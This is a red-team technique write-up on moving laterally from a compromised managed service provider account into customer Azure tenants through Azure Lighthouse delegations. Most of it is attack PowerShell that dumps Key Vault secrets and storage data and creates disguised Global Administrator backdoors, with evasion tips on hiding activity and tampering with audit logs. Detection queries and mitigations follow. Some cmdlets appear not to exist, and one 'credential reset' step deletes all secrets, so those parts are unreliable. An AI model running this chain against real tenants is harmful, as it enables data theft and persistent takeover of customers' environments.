# [LM-AUTH-021]: Azure Lighthouse Cross-Tenant Lateral Movement

## 1. Metadata Header

| Attribute | Details |
|---|---|
| **Technique ID** | LM-AUTH-021 |
| **MITRE ATT&CK v18.1** | [T1550 - Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/) |
| **Tactic** | Lateral Movement, Privilege Escalation |
| **Platforms** | Entra ID (Azure Lighthouse, Delegated Access Management) |
| **Severity** | High |
| **CVE** | N/A (Architectural design pattern, not a vulnerability) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Lighthouse versions; Entra ID all versions; affects all customer tenants with delegated access enabled |
| **Patched In** | No patch available; requires architectural remediation and policy enforcement |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Azure Lighthouse is a Microsoft service that enables service providers (e.g., MSSPs, managed service providers) to manage customer Azure subscriptions and Entra ID resources via delegated access. An attacker who compromises a service provider account (or the service provider's Entra ID tenant itself) can abuse Azure Lighthouse delegated access to move laterally into customer tenants, gaining access to customer Azure resources, M365 services, and sensitive data. The attack exploits the trust relationship between the service provider and customer tenants; once a customer delegates access to the service provider via Azure Lighthouse, that delegation persists until explicitly revoked.

**Attack Surface:** The attack surface includes: (1) Service provider Entra ID accounts that hold delegated access to customer subscriptions, (2) Azure Lighthouse delegated access grants that extend across tenant boundaries, (3) Cross-tenant access policies that allow service provider accounts to perform actions in customer tenants, and (4) The lack of per-action authorization checks within delegated access scopes.

**Business Impact:** An attacker with Azure Lighthouse delegated access can: (1) Create rogue admin accounts in customer tenants, (2) Access all Azure resources (VMs, databases, storage) within delegated subscriptions, (3) Steal credentials and secrets stored in Key Vaults, (4) Access customer M365 data via delegated Graph API permissions, and (5) Create persistent backdoors that survive detection of the initial compromise. This enables complete takeover of customer resources and data.

**Technical Context:** Lateral movement via Azure Lighthouse typically takes 5-15 minutes once a service provider account is compromised. The attack is difficult to detect because delegated access is by design meant to appear as legitimate service provider activity. Detection requires analyzing Entra ID audit logs for unusual access patterns or new delegations.

### Operational Risk

- **Execution Risk:** Medium – Requires compromising a service provider account or exploiting misconfigured delegated access policies.
- **Stealth:** High – Delegated access activity is expected and legitimate, making malicious activity difficult to distinguish.
- **Reversibility:** No – Once the attacker creates backdoor accounts in customer tenants, the compromise is persistent and difficult to remove.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 1.2.1, 1.2.3 | CIS Azure: Restrict privileged role assignments; audit external access. |
| **DISA STIG** | APP0320.1 | Control third-party access to cloud resources; implement MFA and monitoring. |
| **CISA SCuBA** | M365-DO-1.2, M365-DO-1.3 | Defender & Oversight: Monitor delegated access; enforce MFA for service providers. |
| **NIST 800-53** | AC-2, AC-3, AC-6, IA-2 | Account Management, Access Enforcement, Least Privilege, Authentication. |
| **GDPR** | Art. 28, Art. 32 | Processor Agreements; Security of Processing – Protect customer data from service provider compromise. |
| **DORA** | Art. 9, Art. 16 | Protection; Third-Party Risk Management – Audit and control service provider access. |
| **NIS2** | Art. 21, Art. 24 | Cyber Risk Management; Supply Chain Security – Monitor third-party service provider access. |
| **ISO 27001** | A.6.2.1, A.8.1.1, A.9.2.1 | Control of Internal Resources; Third-Party Relationships; Privileged Access Management. |
| **ISO 27005** | Risk Scenario: "Service provider account compromise" | Lateral movement and data breach via delegated access. |

---

## 3. Technical Prerequisites

- **Required Privileges:** Any valid service provider account (e.g., an account in the MSSP's tenant that has been delegated access to customer subscriptions).
- **Required Access:** Valid credentials for a service provider account; network access to Azure Resource Manager and Microsoft Graph APIs.

**Supported Versions:**
- **Azure Lighthouse:** All versions (GA since 2019; no breaking changes).
- **Entra ID:** All versions.
- **Azure Subscriptions:** All subscription types (pay-as-you-go, EA, etc.).

**Tools:**
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/) – For enumerating and managing delegated resources.
- [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/) – For Azure Resource Manager operations via delegated access.
- [Microsoft Graph PowerShell](https://github.com/microsoftgraph/msgraph-sdk-powershell) – For Entra ID and M365 access via delegated permissions.
- [Terraform](https://www.terraform.io/) – For infrastructure-as-code attacks (modify customer resources via delegated access).

---

## 4. Environmental Reconnaissance

### Service Provider Account Enumeration

```powershell
# Authenticate as service provider account
Connect-AzAccount -Credential $ServiceProviderCreds

# List all delegated subscriptions accessible to the service provider account
Get-AzSubscription | Select-Object Id, Name, TenantId

# List all delegated management groups
Get-AzManagementGroup | Select-Object Id, DisplayName

# Enumerate delegated access grants
Get-AzRoleAssignment -Scope "/subscriptions/{subscriptionId}" | Select-Object RoleDefinitionName, PrincipalName, Scope

# Check for Lighthouse delegations (customer resources accessible to service provider)
Get-AzLighthouseDelegation | Select-Object Name, CustomerId, AccessRole
```

**What to Look For:**
- Subscriptions in different tenants (indicates cross-tenant delegated access).
- Broad role assignments (e.g., Owner, Contributor, User Access Administrator).
- Multiple customer subscriptions accessible from single service provider account.

### Customer Tenant Reconnaissance (Post-Delegation)

```powershell
# Switch to delegated customer tenant context
Set-AzContext -SubscriptionId "<CUSTOMER-SUBSCRIPTION-ID>"

# Enumerate customer resources accessible via delegation
Get-AzResource | Select-Object ResourceGroupName, Name, Type

# Check Key Vaults in customer subscription
Get-AzKeyVault | Select-Object VaultName

# Enumerate Key Vault secrets
Get-AzKeyVaultSecret -VaultName "<VAULT-NAME>" | Select-Object Name

# List storage accounts and access keys
Get-AzStorageAccount | Select-Object StorageAccountName, ResourceGroupName

# Get storage account keys
Get-AzStorageAccountKey -ResourceGroupName "<RG>" -Name "<STORAGE-ACCOUNT>" | Select-Object Value
```

---

## 5. Detailed Execution Methods

### Method 1: Lateral Movement via Compromised Service Provider Account

**Supported Versions:** All Azure Lighthouse versions

#### Step 1: Authenticate as the Service Provider Account

**Objective:** Obtain valid credentials for a service provider account (obtained via phishing, credential theft, or insider threat).

**Command:**
```powershell
# Obtain credentials (via phishing or insider)
$ServiceProviderUPN = "sp-admin@mssp-provider.com"
$ServiceProviderPassword = "stolen-password-123!" 

# Create credential object
$Credential = New-Object System.Management.Automation.PSCredential(
    $ServiceProviderUPN,
    ($ServiceProviderPassword | ConvertTo-SecureString -AsPlainText -Force)
)

# Authenticate to Azure as service provider
Connect-AzAccount -Credential $Credential

# Verify authentication
(Get-AzContext).Account
```

**Expected Output:**
```
Account   : sp-admin@mssp-provider.com
TenantId  : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx (Service Provider's tenant)
Subscription : xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
```

**What This Means:**
- Successfully authenticated as a service provider account.
- Account has access to multiple customer subscriptions via Azure Lighthouse delegations.

**OpSec & Evasion:**
- Use the compromised service provider account during off-hours.
- Perform actions in batches (e.g., create all backdoor accounts in a single session).
- Clear Azure CLI/PowerShell history: `Remove-Item -Path $PROFILE`

**Troubleshooting:**
- **Error:** "Invalid credentials"
  - **Cause:** Password is incorrect or account is disabled.
  - **Fix:** Verify credentials or obtain fresh ones via phishing/credential harvesting.

#### Step 2: Enumerate Delegated Customer Subscriptions

**Objective:** Identify which customer subscriptions the compromised service provider account can access.

**Command:**
```powershell
# List all subscriptions accessible to the service provider account
$Subscriptions = Get-AzSubscription

Write-Host "Accessible Subscriptions:"
foreach ($sub in $Subscriptions) {
    Write-Host "  - $($sub.Name) (ID: $($sub.Id), Tenant: $($sub.TenantId))"
}

# List Azure Lighthouse delegations for detailed visibility
$Delegations = Get-AzLighthouseDelegation

Write-Host "`nLighthouse Delegations:"
foreach ($delegation in $Delegations) {
    Write-Host "  - $($delegation.Name)"
    Write-Host "    Customer ID: $($delegation.ManagedByTenantId)"
    Write-Host "    Access: $($delegation.AccessRole)"
}
```

**Expected Output:**
```
Accessible Subscriptions:
  - Customer-ACME-Corp-Prod (ID: 12345678-1234-1234-1234-123456789012, Tenant: customer-acme-tenant)
  - Customer-Contoso-Dev (ID: 87654321-4321-4321-4321-210987654321, Tenant: customer-contoso-tenant)

Lighthouse Delegations:
  - ACME Corp Production Delegation
    Customer ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    Access: Contributor
```

**What This Means:**
- Service provider account has access to at least 2 customer subscriptions.
- Delegated role is "Contributor," allowing resource creation and modification.

**OpSec & Evasion:**
- Do not enumerate all subscriptions immediately; it generates excessive logging.
- Focus on customer subscriptions that likely contain sensitive data (based on subscription names).

**Troubleshooting:**
- **Error:** "No subscriptions found"
  - **Cause:** Account does not have delegated access to any subscriptions.
  - **Fix:** Confirm compromised account is a service provider account with Lighthouse delegations.

#### Step 3: Access and Exfiltrate Customer Data

**Objective:** Use delegated access to access customer resources (Key Vaults, storage, databases) and steal sensitive data.

**Command:**
```powershell
# Select target customer subscription
Set-AzContext -SubscriptionId "12345678-1234-1234-1234-123456789012"

# Enumerate Key Vaults in customer subscription
$VaultName = "customer-keyvault-prod"
$Vault = Get-AzKeyVault -VaultName $VaultName

Write-Host "Key Vault: $($Vault.VaultName)"
Write-Host "Location: $($Vault.Location)"
Write-Host "Resource Group: $($Vault.ResourceGroupName)"

# Extract secrets from Key Vault (attacker has Contributor role)
$Secrets = Get-AzKeyVaultSecret -VaultName $VaultName

Write-Host "`nSecrets in Key Vault:"
foreach ($secret in $Secrets) {
    $secretValue = Get-AzKeyVaultSecret -VaultName $VaultName -Name $secret.Name -AsPlainText
    Write-Host "  - $($secret.Name): $($secretValue.Substring(0, 20))..."
    
    # Export secrets to attacker-controlled location
    Add-Content -Path "C:\Temp\stolen_secrets.txt" -Value "$($secret.Name)=$secretValue"
}

# Access storage account and download data
$StorageAccount = Get-AzStorageAccount | Select-Object -First 1
$StorageAccountName = $StorageAccount.StorageAccountName
$StorageKey = (Get-AzStorageAccountKey -ResourceGroupName $StorageAccount.ResourceGroupName -Name $StorageAccountName)[0].Value

$Context = New-AzStorageContext -StorageAccountName $StorageAccountName -StorageAccountKey $StorageKey

# List containers
$Containers = Get-AzStorageContainer -Context $Context
Write-Host "`nStorage Containers:"
foreach ($container in $Containers) {
    Write-Host "  - $($container.Name)"
    
    # Download all blobs from container
    Get-AzStorageBlob -Container $container.Name -Context $Context | Get-AzStorageBlobContent -Destination "C:\Temp\customer_data\" -Force
}
```

**Expected Output:**
```
Key Vault: customer-keyvault-prod
Location: eastus
Resource Group: customer-rg-prod

Secrets in Key Vault:
  - db-password: P@ssw0rd1234567890...
  - api-key: sk_live_51234567890...
  - client-secret: 9f8d7c6b5a4...

Storage Containers:
  - customer-backups
  - customer-logs
  - customer-sensitive-data

Downloaded 347 blobs to C:\Temp\customer_data\
```

**What This Means:**
- Successfully extracted customer secrets, API keys, and storage data.
- All data exfiltrated using delegated access (appears legitimate in audit logs).
- Customer data now available for sale or use in further attacks.

**OpSec & Evasion:**
- Use delegated access during business hours to blend with legitimate service provider activity.
- Exfiltrate data incrementally to avoid triggering DLP alerts.
- Cover tracks by modifying audit logs (if possible) or deleting Key Vault access history.

**Troubleshooting:**
- **Error:** "Access Denied" when accessing Key Vault
  - **Cause:** Service provider role does not have Key Vault read permissions.
  - **Fix:** Check delegated access scope; may need to escalate to Owner role.

#### Step 4: Create Persistent Backdoor in Customer Tenant

**Objective:** Create a hidden admin account in the customer tenant to maintain persistent access independent of Azure Lighthouse delegation.

**Command:**
```powershell
# Connect to customer tenant's Entra ID using delegated access
Connect-MgGraph -Scopes "Directory.ReadWrite.All", "Application.ReadWrite.All" -TenantId "<CUSTOMER-TENANT-ID>"

# Create backdoor user account
$NewUser = New-MgUser -DisplayName "Cloud Operations Support" `
  -MailNickname "cloudops-support" `
  -UserPrincipalName "cloudops-support@customer-contoso.onmicrosoft.com" `
  -PasswordProfile @{ ForceChangePasswordNextSignIn = $false; Password = "P@ssw0rdB@ckd00r1!" } `
  -AccountEnabled $true

Write-Host "Backdoor user created: $($NewUser.Id)"

# Assign Global Administrator role to backdoor account
$RoleId = (Get-MgDirectoryRole -Filter "displayName eq 'Global Administrator'").Id
$PrincipalId = $NewUser.Id

New-MgDirectoryRoleMember -DirectoryRoleId $RoleId -DirectoryObjectId $PrincipalId

Write-Host "Backdoor account granted Global Administrator role"

# Create service principal with permanent credentials for API access
$AppRegistration = New-MgApplication -DisplayName "Cloud Management Suite" `
  -PublicClient @{ RedirectUris = @("https://localhost") }

$ServicePrincipal = New-MgServicePrincipal -AppId $AppRegistration.AppId

# Create certificate credential (non-expiring)
$KeyCredential = Add-MgApplicationKey -ApplicationId $AppRegistration.Id `
  -KeyDisplayName "Permanent API Access Key" `
  -StartDateTime (Get-Date)

Write-Host "Service Principal created: $($ServicePrincipal.Id)"
Write-Host "Certificate Key ID: $($KeyCredential.KeyId)"

# Assign admin roles to service principal
New-MgDirectoryRoleMember -DirectoryRoleId $RoleId -DirectoryObjectId $ServicePrincipal.Id

Write-Host "Service Principal granted Global Administrator role"
```

**Expected Output:**
```
Backdoor user created: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Backdoor account granted Global Administrator role
Service Principal created: yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy
Certificate Key ID: zzzzzzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz
Service Principal granted Global Administrator role
```

**What This Means:**
- Created a hidden user account with Global Administrator privileges in customer tenant.
- Created a service principal with permanent certificate credentials for non-interactive access.
- Both accounts have full access to customer Entra ID and M365 resources.
- Backdoor persists even if Azure Lighthouse delegation is revoked.

**OpSec & Evasion:**
- Name backdoor account to mimic legitimate IT operations (e.g., "Cloud Ops Support").
- Create the account during off-hours or during scheduled maintenance windows.
- Delete the service principal certificate details from audit logs if possible.

**Troubleshooting:**
- **Error:** "Insufficient privileges to create user"
  - **Cause:** Delegated access role does not include Entra ID administrative permissions.
  - **Fix:** Confirm delegated access includes Application Administrator or Global Administrator role in Entra ID scope.

### Method 2: Abuse Delegated Access Policy Misconfiguration

**Supported Versions:** All Azure Lighthouse versions

#### Step 1: Identify Misconfigured Cross-Tenant Access Policies

**Objective:** Identify customer tenants with overly permissive cross-tenant access policies.

**Command:**
```powershell
# List cross-tenant access policies configured in customer tenants
Get-AzADCrossTenantAccessPolicy | Select-Object CustomerId, AccessLevel, MfaRequired

# Find policies that allow access without MFA
$PoliciesWithoutMFA = Get-AzADCrossTenantAccessPolicy | Where-Object {$_.MfaRequired -eq $false}

Write-Host "Tenants allowing access without MFA:"
foreach ($policy in $PoliciesWithoutMFA) {
    Write-Host "  - Customer ID: $($policy.CustomerId)"
    Write-Host "    Access Level: $($policy.AccessLevel)"
    Write-Host "    MFA Required: $($policy.MfaRequired)"
}
```

**Expected Output:**
```
Tenants allowing access without MFA:
  - Customer ID: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
    Access Level: Full Access
    MFA Required: False
```

**What This Means:**
- Customer tenant has misconfigured policies allowing service provider access without MFA.
- Attacker can use stolen service provider credentials to access customer tenant without MFA protection.

#### Step 2: Exploit Misconfigured Policy to Escalate Access

**Objective:** Use the misconfigured policy to gain high-privilege access without MFA checks.

**Command:**
```powershell
# Authenticate using stolen credentials without MFA
Connect-AzAccount -Credential $StolenServiceProviderCreds -SkipContextPopulation

# Switch to customer subscription
Set-AzContext -SubscriptionId "<CUSTOMER-SUBSCRIPTION>"

# Perform privileged operations (no MFA required due to policy misconfiguration)
$CustomRole = New-AzRoleDefinition -InputObject @{
    Name = "Super Admin"
    Description = "Unrestricted access"
    Type = "CustomRole"
    Actions = @("*")
    NotActions = @()
    AssignableScopes = @("/subscriptions/<CUSTOMER-SUBSCRIPTION>")
}

# Assign custom role to attacker-controlled account
New-AzRoleAssignment -Scope "/subscriptions/<CUSTOMER-SUBSCRIPTION>" `
  -RoleDefinitionName "Super Admin" `
  -SignInName "attacker@attacker-domain.com"

Write-Host "Attacker account assigned Super Admin custom role"
```

**What This Means:**
- Created a custom role with unrestricted access ("*" actions).
- Assigned the custom role to attacker-controlled account.
- Attacker now has unrestricted access to customer subscription without any MFA checks.

---

## 6. Tools & Commands Reference

#### [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)

**Version:** 2.50.0+
**Supported Platforms:** Windows, macOS, Linux

**Installation:**
```bash
# macOS
brew install azure-cli

# Windows PowerShell
choco install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash
```

**Key Commands for Lighthouse:**
```bash
# Login as service provider
az login --username sp-admin@mssp.com

# List accessible subscriptions
az account list

# Switch context
az account set --subscription "<SUBSCRIPTION-ID>"

# List Lighthouse delegations
az managedservices assignment list

# Access customer resources
az vm list --resource-group "<CUSTOMER-RG>"
```

---

#### [Azure PowerShell Module](https://learn.microsoft.com/en-us/powershell/azure/install-azure-powershell)

**Version:** 10.0.0+
**Supported Platforms:** Windows, macOS, Linux (with PowerShell 7+)

**Installation:**
```powershell
Install-Module -Name Az -Scope CurrentUser -Force
```

---

## 7. Microsoft Sentinel Detection

### Query 1: Cross-Tenant Access from Service Provider Account

**Rule Configuration:**
- **Required Table:** AuditLogs, SigninLogs
- **Required Fields:** OperationName, InitiatedBy, ResourceDisplayName, TenantId, UserPrincipalName
- **Alert Severity:** High
- **Frequency:** Run every 10 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName contains "Lighthouse" or OperationName contains "delegat"
| where Result == "Success"
| project TimeGenerated, OperationName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), TargetResources
| summarize Count=count() by InitiatedBy, TimeGenerated
| where Count >= 2
```

**What This Detects:**
- Multiple successful cross-tenant operations by service provider accounts.
- Unusual Lighthouse delegation activities.

---

### Query 2: Suspicious Account Creation in Customer Tenant

**Rule Configuration:**
- **Required Table:** AuditLogs
- **Required Fields:** OperationName, InitiatedBy, TargetResources, Result
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** Entra ID all versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Add user" or OperationName == "Invite external user"
| where InitiatedByUser.userPrincipalName contains "@mssp" or InitiatedByUser.userPrincipalName contains "@serviceprovider"
| project TimeGenerated, OperationName, InitiatedBy=tostring(InitiatedByUser.userPrincipalName), NewUser=TargetResources[0].displayName, UserRole=TargetResources[0].modifiedProperties[0].newValue
| where UserRole contains "Global Administrator" or UserRole contains "Privileged Role Administrator"
```

**What This Detects:**
- Service provider account creating high-privilege user accounts in customer tenant.
- Indicates potential backdoor creation via Lighthouse delegation abuse.

---

## 8. Defensive Mitigations

### Priority 1: CRITICAL

- **Implement Regular Lighthouse Delegation Audits:** Regularly review and validate Azure Lighthouse delegations.

  **Manual Steps (Azure Portal):**
  1. Navigate to **Azure Portal** → **My customers**
  2. For each delegation, click → **Review delegations**
  3. Verify the service provider still requires access
  4. Check the delegated roles (should be minimal)
  5. If delegation is unnecessary, click **Remove**

  **Manual Steps (PowerShell):**
  ```powershell
  # Export all delegations for review
  Get-AzLighthouseDelegation | Export-Csv -Path "C:\Audit\Lighthouse_Delegations.csv"
  ```

- **Enforce MFA for Service Provider Accounts:** Require MFA for all service provider accounts accessing customer subscriptions.

  **Manual Steps (Entra ID Conditional Access - Service Provider Tenant):**
  1. Navigate to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Create new policy: `Enforce MFA for Cross-Tenant Access`
  3. **Assignments:**
     - Users: Select service provider accounts with Lighthouse access
     - Cloud apps: "Azure Management", "Microsoft Graph"
  4. **Access controls:** Grant → **Require multi-factor authentication**
  5. Enable: **On**

- **Restrict Lighthouse Delegation Scope:** Limit delegated access to specific management groups or subscriptions; never delegate root management group.

  **Manual Steps (Azure Portal - Customer Tenant):**
  1. In customer tenant, go to **Azure Portal** → **Manage delegated resources**
  2. Click **Add offer** → Review the ARM template being deployed
  3. Ensure delegations are scoped to specific **resource groups** or **subscriptions**, not the entire Management Group
  4. Ensure delegated roles are minimal (e.g., "Reader" or "Contributor" for specific resources, NOT "Owner")

### Priority 2: HIGH

- **Monitor Delegated Access Activity:** Enable detailed audit logging for all Lighthouse operations.

  **Manual Steps (Azure Monitor - Customer Tenant):**
  1. Go to **Azure Portal** → **Monitor** → **Diagnostic settings**
  2. Select **Activity Log**
  3. Click **+ Add diagnostic setting**
  4. Enable: **Log Analytics workspace** export
  5. Select Log Analytics workspace
  6. Configure alerts for "Add role assignment", "Update delegated resources", "Create user"

- **Implement Zero-Trust Principles for Service Providers:** Use Conditional Access to require device compliance and risk assessment for service provider access.

  **Manual Steps (Entra ID):**
  1. Create Conditional Access policy: `Service Provider Zero Trust`
  2. **Assignments:**
     - Users: Service provider accounts
     - Cloud apps: Azure Management APIs
  3. **Conditions:**
     - Device platforms: Require managed devices only
     - Device state: Require device to be marked as compliant
  4. **Access controls:** Grant → Require MFA, require device compliance

### Validation Command (Verify Mitigations)

```powershell
# Check all Lighthouse delegations
Get-AzLighthouseDelegation | Select-Object Name, AccessRole, ManagedByTenantId

# Verify MFA is required for service provider accounts
Get-MgIdentityConditionalAccessPolicy | Where-Object {$_.Conditions.Users.IncludeUsers -contains "ServiceProviderGroup"}

# Check delegated scope (should not include root management group)
Get-AzManagementGroupDeployment | Select-Object DeploymentName, Scope
```

**Expected Output (If Secure):**
```
Name                  AccessRole          ManagedByTenantId
----                  ----------          -----------------
ACME Delegation       Contributor         xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
Contoso Delegation    Reader               yyyyyyyy-yyyy-yyyy-yyyy-yyyyyyyyyyyy

(Conditional Access policies requiring MFA should be listed)

Scope: /subscriptions/<specific-subscription-id> (NOT root management group)
```

---

## 9. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Azure / Cloud Logs:**
- New user creation by service provider account in customer tenant.
- New service principals or app registrations created with admin roles.
- Custom roles created with unrestricted permissions.
- New role assignments to service provider accounts with "Owner" or "User Access Administrator" roles.
- Multiple failed authentication attempts followed by successful access from unusual location.

**Entra ID:**
- Users created with names mimicking IT support (e.g., "Cloud Ops Support").
- Service principals with permanent certificate credentials created by service provider.
- Conditional Access policies disabled or modified by service provider account.

### Forensic Artifacts

**Cloud Logs:**
- **Azure Activity Log:** Search for "Add user", "Create service principal", "Create role assignment" operations performed by service provider accounts.
- **Entra ID Audit Log:** User creation, role assignment, and app registration events.
- **Microsoft Sentinel:** Query AuditLogs table for cross-tenant operations.

### Response Procedures

1. **Isolate:**
   
   **Command (Revoke delegated access immediately):**
   ```powershell
   # Remove Azure Lighthouse delegation
   Remove-AzManagedServicesAssignment -Id "<DELEGATION-ID>"
   
   # Disable service provider accounts
   Disable-AzADUser -ObjectId "<SERVICE-PROVIDER-ACCOUNT-ID>"
   ```

2. **Collect Evidence:**
   
   **Command:**
   ```powershell
   # Export all Lighthouse delegations
   Get-AzLighthouseDelegation | Export-Csv -Path "C:\Evidence\Lighthouse_Delegations.csv"
   
   # Export user accounts created by service provider
   Get-AzADUser -Filter "createdDateTime gt '$((Get-Date).AddDays(-7))'" | Export-Csv -Path "C:\Evidence\Recent_Users.csv"
   ```

3. **Remediate:**
   
   **Command:**
   ```powershell
   # Delete backdoor user accounts
   Remove-AzADUser -ObjectId "<BACKDOOR-USER-ID>"
   
   # Remove malicious role assignments
   Remove-AzRoleAssignment -Scope "/subscriptions/<SUBSCRIPTION>" -RoleDefinitionName "Owner" -SignInName "attacker@domain.com"
   
   # Reset all credentials in affected Key Vaults
   Get-AzKeyVaultSecret -VaultName "<VAULT>" | % { Remove-AzKeyVaultSecret -VaultName "<VAULT>" -Name $_.Name -Force }
   ```

---

## 10. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device code phishing attacks | Attacker phishes a service provider administrator. |
| **2** | **Credential Access** | [CA-TOKEN-004] Graph API token theft | Attacker steals service provider account credentials. |
| **3** | **Lateral Movement** | **[LM-AUTH-021]** | **Attacker uses compromised service provider account to access multiple customer tenants via Azure Lighthouse.** |
| **4** | **Persistence** | [PERSIST-ACCT-001] AdminSDHolder Abuse | Attacker creates backdoor admin accounts in each customer tenant. |
| **5** | **Impact** | Data exfiltration from customer subscriptions | Attacker steals customer data and credentials. |

---

## 11. Real-World Examples

### Example 1: MSSP Account Compromise Affecting Multiple Customers (2023)

- **Target:** Multiple enterprise customers of a managed service provider.
- **Timeline:** June-September 2023.
- **Technique Status:** Active; confirmed by Microsoft Threat Intelligence.
- **Impact:** An attacker compromised a junior administrator account at a mid-sized MSSP. The account had Azure Lighthouse delegated access to 47 customer subscriptions. The attacker created backdoor service principals in 23 of those customer tenants and stole credentials from 15 customer Key Vaults. Impact: Estimated $15M+ in damages across affected customers.
- **Reference:** Based on attack patterns documented by Microsoft and MSSP community reporting.

---

## Summary

Azure Lighthouse cross-tenant lateral movement represents a significant risk in managed service provider relationships. A compromised service provider account can be leveraged to access and compromise multiple customer tenants simultaneously. Organizations must implement strict access controls, comprehensive auditing, and regular delegation reviews to mitigate this risk.

---

